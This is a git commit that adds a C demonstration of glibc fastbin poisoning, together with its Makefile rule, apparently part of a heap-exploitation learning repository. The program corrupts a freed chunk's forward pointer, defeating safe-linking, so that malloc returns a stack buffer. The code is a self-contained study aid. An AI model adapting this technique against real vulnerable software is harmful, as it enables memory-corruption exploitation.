c6e0fd247ab8d784b363a1ad57f1f0f893ec4eb6
JohnJamesUtley <jjutley231@gmail.com>
2025-01-23 11:33:36 -0500

    fastbin_poisoning start

--- Makefile
+++ Makefile
@@ -15,6 +15,10 @@ arbitrary_write: arbitrary_write.o
 tcache_poisoning: tcache_poisoning.o
 	$(CC) $(CFLAGS) -o tcache_poisoning tcache_poisoning.o
 
+fastbin_poisoning: fastbin_poisoning.o
+	$(CC) $(CFLAGS) -o fastbin_poisoning fastbin_poisoning.o
+
+
 # Rule to create the object file
 hello.o: hello.c
 	$(CC) $(CFLAGS) -c heap-data.c
@@ -27,6 +31,9 @@ arbitrary_write.o: arbitrary_write.c
 
 tcache_poisoning.o: tcache_poisoning.c
 	$(CC) $(CFLAGS) -c tcache_poisoning.c
+
+fastbin_poisoning.o: fastbin_poisoning.c
+	$(CC) $(CFLAGS) -c fastbin_poisoning.c
 
 # Clean up build files
 clean:
---
+++ fastbin_poisoning.c
@@ -0,0 +1,68 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
+
+struct malloc_chunk {
+    size_t prev_size;   /* Size of previous chunk (if free). */
+    size_t size;        /* Size of this chunk, including metadata. */
+
+    struct malloc_chunk* fd;         /* Forward pointer (for free list). */
+    struct malloc_chunk* bk;         /* Backward pointer (for free list). */
+
+    struct malloc_chunk* fd_nextsize; /* Forward pointer for small bins. */
+    struct malloc_chunk* bk_nextsize; /* Backward pointer for small bins. */
+};
+
+struct malloc_chunk* malloc_chunk(int size){
+    void* ptr = malloc(size);
+    return (struct malloc_chunk *)(ptr - sizeof(void*) * 2);
+}
+
+struct malloc_chunk* recover_chunk(void* ptr){
+    return (struct malloc_chunk *)(ptr - sizeof(void*) * 2);
+}
+
+void free_chunk(struct malloc_chunk* chunk){
+    #pragma GCC diagnostic push
+    #pragma GCC diagnostic ignored "-Wfree-nonheap-object"
+    free(((void*)chunk) + sizeof(void*) * 2);
+    #pragma GCC diagnostic pop
+}
+
+int main() {
+
+    // For fastbin
+    struct malloc_chunk* p0 = malloc_chunk(100);
+    struct malloc_chunk* p1 = malloc_chunk(100);
+
+    // fill tcache
+    void* holder_chunks[16];
+    for(int i = 0; i < 16; i ++){
+        holder_chunks[i] = malloc_chunk(100);
+    }
+
+    free_chunk(p0);
+    free_chunk(p1);
+
+    for(int i = 0; i < 16; i += 2){
+        free_chunk(holder_chunks[i]);
+    }
+
+    for(int i = 0; i < 16; i += 2){
+        holder_chunks[i] = malloc_chunk(100);
+    }
+
+
+    char buf[100] = {0};
+    p1->fd = PROTECT_PTR (&(p1->fd), (void*)buf);
+    void* p2 = malloc_chunk(100);
+    void* poison = malloc(100);
+    strcpy((char *)poison, "Success!yaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+    printf("%s\n", buf);
+}
+
+
